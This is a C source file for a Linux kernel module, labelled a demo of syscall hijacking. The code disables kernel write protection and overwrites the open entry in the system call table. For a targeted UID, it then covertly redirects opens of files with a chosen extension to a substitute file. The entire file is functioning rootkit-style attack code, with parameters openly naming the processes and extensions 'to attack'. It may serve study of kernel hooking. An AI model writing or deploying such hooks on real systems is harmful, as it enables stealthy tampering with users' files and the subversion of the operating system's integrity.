#include <linux/init.h>

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/moduleparam.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <asm/cacheflush.h>

#define NO_PROTECTION(X) \
  do{ \
      unsigned long __cr0; \
      preempt_disable(); \
      __cr0 = read_cr0() & (~X86_CR0_WP); \
      write_cr0(__cr0); \
      X; \
      __cr0 = read_cr0() | X86_CR0_WP; \
      write_cr0(__cr0); \
      preempt_enable(); \
    }while(0)

#define PERMISSION_OCTAL S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP

MODULE_AUTHOR("Adrish Dey <rickdey1998@gmail.com>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Demo Application for Syscall Hijacking");

static unsigned int uid;
static void **sys_call_table;
static kuid_t cur_uid;
static char *filename, *target_extension;
module_param(uid, uint, PERMISSION_OCTAL);
MODULE_PARM_DESC(uid, " UID of the processes to attack");
module_param(filename, charp, PERMISSION_OCTAL);
MODULE_PARM_DESC(filename, " Path to file to open");
module_param(target_extension, charp, PERMISSION_OCTAL);
MODULE_PARM_DESC(target_extension, " Name of the extension to attack");

static void set_page_rw(unsigned long address){
  unsigned int level;
  pte_t *permissions = lookup_address(address, &level);
  printk("Setting Page Permissions to Read/Write\n");
  if(permissions->pte & ~_PAGE_RW)
    permissions->pte |= _PAGE_RW;
}

static void set_page_ro(unsigned long address){
  unsigned int level;
  pte_t *permissions = lookup_address(address, &level);
  printk("Setting Page Permissions to Read-Only\n");
  permissions->pte &= ~_PAGE_RW;
}

static inline int user_strlen(const char *path){
  char character = '\0';
  int length = 0;
  do{
    get_user(character, path + length);
    length++;
  }while(character !='\0');
  return length - 1;
}

asmlinkage int (*original_open)(const char*, int, mode_t);
asmlinkage int _hacked__NR_open(const char* path, int flags, mode_t mode){
  char *cloned_path, extension[4];
  int length = user_strlen(path);
  cloned_path = (char*) (path + length - 4);
  copy_from_user(extension, cloned_path, 4);
  cur_uid = current_uid();
  printk("Extension: %s\nTarget Extension: %s\n", extension, target_extension);
  if(cur_uid.val == uid){
    if(!strcasecmp(extension, target_extension)){
      printk(KERN_INFO "Target file extension found. Filename %s. Patching.\n", path);  
    return original_open(filename, flags, mode);
    }
  }
  return original_open(path, flags, mode);
}

static int __init mod_init(void){
  sys_call_table = (void**) kallsyms_lookup_name("sys_call_table");
  original_open = (int(*)(const char*, int, mode_t))sys_call_table[__NR_open];
  set_page_rw((unsigned long) sys_call_table);
  NO_PROTECTION(sys_call_table[__NR_open] = (void*)_hacked__NR_open);
  return 0;
}
static void __exit mod_exit(void){
  printk(KERN_INFO "Removing hacked open syscall\n");
  if (sys_call_table[__NR_open] != (void*) _hacked__NR_open)
    printk(KERN_ALERT "Some one else played with the syscall hook!\n");
  sys_call_table[__NR_open] = (void*) original_open;
  set_page_ro((unsigned long) sys_call_table);
  printk(KERN_INFO "Removed\n");
}

module_init(mod_init);
module_exit(mod_exit);
